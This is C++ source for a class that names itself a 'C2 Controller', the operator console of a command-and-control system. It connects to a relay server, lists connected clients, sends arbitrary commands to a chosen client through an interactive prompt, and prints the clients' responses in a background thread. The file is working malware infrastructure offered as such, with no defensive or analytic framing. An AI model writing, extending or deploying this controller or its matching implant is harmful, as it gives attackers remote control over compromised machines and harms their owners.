#include "Controller.h"
#include <iostream>
#include <sstream>

Controller::Controller(const std::string& serverHost, int serverPort)
    : serverHost_(serverHost), serverPort_(serverPort), socket_(INVALID_SOCKET), running_(false) {}

Controller::~Controller() {
    Disconnect();
}

bool Controller::Connect() {
    if (!network_.Initialize()) {
        return false;
    }

    socket_ = network_.ConnectToServer(serverHost_, serverPort_);
    if (socket_ == INVALID_SOCKET) {
        return false;
    }

    running_ = true;
    receiveThread_ = std::thread(&Controller::ReceiveLoop, this);

    return true;
}

void Controller::Disconnect() {
    if (!running_) {
        return;
    }

    running_ = false;

    if (socket_ != INVALID_SOCKET) {
        network_.CloseSocket(socket_);
        socket_ = INVALID_SOCKET;
    }

    if (receiveThread_.joinable()) {
        receiveThread_.join();
    }

    network_.Cleanup();
}

bool Controller::SendCommand(const std::string& clientId, const std::string& command) {
    std::vector<uint8_t> data;
    Protocol::SerializeString(data, clientId);
    Protocol::SerializeString(data, command);

    auto message = Protocol::CreateMessage(MessageType::COMMAND, data);
    return network_.Send(socket_, message);
}

void Controller::ListClients() {
    std::vector<uint8_t> empty;
    auto message = Protocol::CreateMessage(MessageType::SYSTEM_INFO, empty);
    network_.Send(socket_, message);
}

void Controller::RunInteractive() {
    std::cout << "=== C2 Controller ===" << std::endl;
    std::cout << "Commands:" << std::endl;
    std::cout << "  list                    - List all connected clients" << std::endl;
    std::cout << "  cmd <client_id> <cmd>   - Send command to client" << std::endl;
    std::cout << "  quit                    - Exit controller" << std::endl;
    std::cout << std::endl;

    std::string line;
    while (running_ && std::getline(std::cin, line)) {
        if (line.empty()) {
            continue;
        }

        std::istringstream iss(line);
        std::string command;
        iss >> command;

        if (command == "quit") {
            break;
        } else if (command == "list") {
            ListClients();
        } else if (command == "cmd") {
            std::string clientId, cmd;
            iss >> clientId;
            std::getline(iss, cmd);
            if (!clientId.empty() && !cmd.empty()) {
                SendCommand(clientId, cmd);
            } else {
                std::cout << "Usage: cmd <client_id> <command>" << std::endl;
            }
        } else {
            std::cout << "Unknown command: " << command << std::endl;
        }
    }
}

void Controller::ReceiveLoop() {
    std::vector<uint8_t> buffer;

    while (running_) {
        auto chunk = network_.Receive(socket_, 4096);
        if (chunk.empty()) {
            break;
        }

        buffer.insert(buffer.end(), chunk.begin(), chunk.end());

        while (buffer.size() >= sizeof(MessageHeader)) {
            MessageHeader header;
            std::vector<uint8_t> data;

            if (Protocol::ParseMessage(buffer, header, data)) {
                ProcessMessage(header.type, data);

                size_t messageSize = sizeof(MessageHeader) + header.length;
                buffer.erase(buffer.begin(), buffer.begin() + messageSize);
            } else {
                break;
            }
        }
    }

    running_ = false;
}

void Controller::ProcessMessage(MessageType type, const std::vector<uint8_t>& data) {
    switch (type) {
    case MessageType::RESPONSE: {
        const uint8_t* ptr = data.data();
        size_t remaining = data.size();
        std::string response = Protocol::DeserializeString(ptr, remaining);
        std::cout << "Response: " << response << std::endl;
        break;
    }

    default:
        break;
    }
}
